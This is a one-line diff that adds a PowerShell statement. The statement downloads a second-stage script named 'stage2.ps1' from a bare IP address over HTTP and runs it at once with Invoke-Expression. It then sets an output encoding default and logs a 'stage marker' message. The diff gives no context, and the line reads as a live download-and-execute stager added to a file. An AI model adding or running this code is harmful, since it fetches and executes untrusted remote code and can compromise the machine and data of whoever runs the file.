@@ -1,0 +1,1 @@
+$PayloadUrl = 'http://198.51.100.12:80/stage2.ps1'; IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Verbose "stage marker 39 reached"
